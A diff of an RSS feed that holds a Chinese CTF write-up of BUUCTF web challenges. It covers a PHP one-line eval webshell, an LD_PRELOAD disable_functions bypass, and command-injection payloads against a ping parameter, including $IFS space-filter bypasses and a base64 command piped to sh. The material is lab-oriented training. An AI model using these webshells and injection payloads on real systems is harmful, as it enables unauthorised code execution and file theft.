@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>BUUCTF_Web on</title><link>/tags/buuctf_web/</link><description>Recent content in BUUCTF_Web on</description><generator>Hugo</generator><language>en</language><lastBuildDate>Mon, 18 Jan 2021 16:58:56 +0000</lastBuildDate><atom:link href="/tags/buuctf_web/index.xml" rel="self" type="application/rss+xml"/><item><title>BUUCTF寒假刷题-Web</title><link>/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</link><pubDate>Mon, 18 Jan 2021 16:58:56 +0000</pubDate><guid>/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</guid><description>&lt;p>寒假横向刷题（尽量）
 &lt;a href="https://buuoj.cn/challenges#">BUUCTF&lt;/a>
 💗🧡💛💚💙💜🤎🖤🤍
-&lt;strong>题都写这一个里面了，可以先用&lt;!-- raw HTML omitted -->Ctrl&lt;!-- raw HTML omitted -->+&lt;!-- raw HTML omitted -->F&lt;!-- raw HTML omitted -->搜索，还有部分是草稿还没有整理，不过我认为的思路已经整理出来了，看不懂还请大伙见谅。有问题了很乐意效劳💨&lt;/strong>&lt;/p>
+&lt;strong>题都写这一个里面了，可以先用&lt;code>Ctrl+F&lt;/code>搜索，还有部分是草稿还没有整理，不过我认为的思路已经整理出来了，看不懂还请大伙见谅。有问题了很乐意效劳💨&lt;/strong>&lt;/p>
 &lt;h1 id="20210115">2021.01.15&lt;/h1>
 &lt;h1 id="hctf-2018warmup">[HCTF 2018]WarmUp&lt;/h1>
 &lt;p>进到靶机一个硕大的滑稽，查看源码有提示source.php&lt;/p>
@@ -100,15 +100,13 @@ else{
 &lt;p>&lt;strong>利用环境变量LD_PRELOAD来绕过&lt;/strong>&lt;/p>
 &lt;blockquote>
 &lt;p>php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的&lt;/p>
-&lt;p>LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。&lt;/p>
-&lt;/blockquote>
+&lt;p>LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。&lt;/p>&lt;/blockquote>
 &lt;p>正好蚁剑的插件中就有一个名为：&lt;a href="https://github.com/Medicean/as_bypass_php_disable_functions">as_bypass_php_disable_functions&lt;/a>的插件，可以选择在插件市场安装或是手动安装（github有步骤）。安装以后右键shell选择加载插件：&lt;/p>
 &lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204234337.png" alt="">&lt;/p>
 &lt;p>插件的工作原理是自动上传几个绕过的文件，然后再用蚁剑连接上传的文件即可实现绕过，但是一开始的&lt;code>/var/www/html&lt;/code>目录是没有上传权限的，我右键以后发现能修改权限，改成0777：&lt;/p>
 &lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204190508.png" alt="">&lt;/p>
 &lt;blockquote>
-&lt;p>在这里我还遇到了问题，使用原来的shell执行插件功能以后，终端还是没有权限，但是我尝试了自己又上传了一个一句话木马，用这个新的一句话木马执行插件才成功，具体原因我也不清楚，如果有师傅知道原因求告知。&lt;/p>
-&lt;/blockquote>
+&lt;p>在这里我还遇到了问题，使用原来的shell执行插件功能以后，终端还是没有权限，但是我尝试了自己又上传了一个一句话木马，用这个新的一句话木马执行插件才成功，具体原因我也不清楚，如果有师傅知道原因求告知。&lt;/p>&lt;/blockquote>
 &lt;p>上传一句话木马233.php：&lt;/p>
 &lt;pre tabindex="0">&lt;code>&amp;lt;?php
 @eval($_POST[&amp;#39;b&amp;#39;]);
@@ -153,5 +151,43 @@ $IFS$1 //$1改成$加其他数字貌似都行
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>一些基本的符号、空格、bash、任何形式的flag字眼都被过滤了。接下来就是找访问&lt;strong>flag.php&lt;/strong>。在网上看了好多的题解，用了好多方法，但是网页输出都为空，原来以为和其他题目一样使用&lt;strong>readflag&lt;/strong>的ELF执行文件访问，但是还没成功。其实执行：&lt;/p>
 &lt;pre tabindex="0">&lt;code>?ip=|cat$IFS`ls`
-&lt;/code>&lt;/pre>&lt;p>这个payload的时候文件都已经输出了，我最后在网页源码找到了，原来是被注释了&lt;!-- raw HTML omitted -->我是傻逼&lt;!-- raw HTML omitted -->。&lt;/p>
-&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205110806.png" alt="">&lt;/p></description></item></channel></rss>
+&lt;/code>&lt;/pre>&lt;p>这个payload的时候文件都已经输出了，我最后在网页源码找到了，原来是被注释了&lt;del>我是傻逼&lt;/del>。&lt;/p>
+&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205110806.png" alt="">&lt;/p>
+&lt;p>&lt;strong>最后记录下学到的姿势和这道题目的其他思路&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>管道符：&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>|&lt;/code>直接执行后面的语句。&lt;/li>
+&lt;li>&lt;code>||&lt;/code>如果前面语句错误，执行后面的语句。&lt;/li>
+&lt;li>&lt;code>&amp;amp;&lt;/code>前面和后面命令都要执行，无论前面真假，&lt;/li>
+&lt;li>&lt;code>&amp;amp;&amp;amp;&lt;/code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>使用以下绕过空格：&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>$IFS
+${IFS}
+${IFS}$1
+$IFS$1 //$1改成$加其他数字貌似都行
+&amp;lt;
+&amp;lt;&amp;gt; 
+{cat,flag.php} //用逗号实现了空格功能
+%20 
+%09 //需要php环境
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>覆盖源码里的&lt;code>$a&lt;/code>变量（拼接变量）：&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>使用sh执行脚本：&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>/?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>内联执行：&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>/?ip=|cat$IFS`ls`
+&lt;/code>&lt;/pre>&lt;blockquote>
+&lt;p>附：大佬整理的博客（内含更多姿势）：&lt;a href="https://www.ghtwf01.cn/index.php/archives/273/">命令执行漏洞利用及绕过方式总结&lt;/a>&lt;/p></description></item></channel></rss>
